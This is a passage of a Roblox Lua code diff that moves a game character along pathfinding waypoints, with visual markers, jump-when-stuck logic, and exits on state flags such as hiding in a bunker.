+            Folder:ClearAllChildren()
+            for _, wp in pairs(Waypoints) do
+                if isScriptFinished or forceRecomputePath or isSafeInBunker then break end
+                local p = Instance.new("Part")
+                p.Size = Vector3.new(0.3, 0.3, 0.3); p.Position = wp.Position
+                p.Shape = "Ball"; p.Material = "Neon"
+                p.Color = Color3.fromRGB(0, 255, 150)
+                p.Anchored = true; p.CanCollide = false; p.Parent = Folder
+            end
+            for _, wp in pairs(Waypoints) do
+                if isSafeInBunker or forceRecomputePath or isScriptFinished or isReturning
+                   or isTeleporting or a120Mode == "navigating" then
+                    currentTarget = nil; break
+                end
+                if not hrp.Anchored then
+                    currentTarget = wp.Position
+                    local lastPos = hrp.Position; local t0 = os.clock(); local jumped = false
+                    repeat
+                        task.wait(0.02)
+                        if isSafeInBunker or forceRecomputePath or isScriptFinished
+                           or isReturning or isTeleporting or a120Mode == "navigating" then
+                            currentTarget = nil; break
+                        end
+                        local d = (Vector3.new(wp.Position.X, hrp.Position.Y, wp.Position.Z) - hrp.Position).Magnitude
+                        if (hrp.Position - lastPos).Magnitude < 0.4 and (os.clock() - t0) > 0.3 then
+                            if not jumped and humanoid then
+                                humanoid.Jump = true; jumped = true; t0 = os.clock()
+                            else break end
+                        end
+                    until d <= 2.2 or isSafeInBunker or forceRecomputePath
+                        or isScriptFinished or isReturning or isTeleporting
+                    if isSafeInBunker or forceRecomputePath or isScriptFinished or isReturning or isTeleporting then
+                        currentTarget = nil; break
+                    end
+                end
+            end
+        else
+            if humanoid and not isSafeInBunker then
+                currentTarget = Destination.Position
+                humanoid:MoveTo(Destination.Position)
+                local t0 = os.clock()
+                repeat task.wait(0.1)
+                    if isSafeInBunker or (forceEmergencyStop and a120Mode ~= "hiding") then break end
+                until (hrp.Position - Destination.Position).Magnitude <= 4
+                    or os.clock() - t0 > 3.5 or forceRecomputePath or isSafeInBunker
+                currentTarget = nil
+            end
+            task.wait(0.1); continue
+        end
+    end
+
+    if forceRecomputePath and not isSafeInBunker and not forceEmergencyStop
+       and not isReturning and a120Mode == "none" then
+        forceRecomputePath = false; currentTarget = nil
+    end
+    task.wait(0.05)
+end
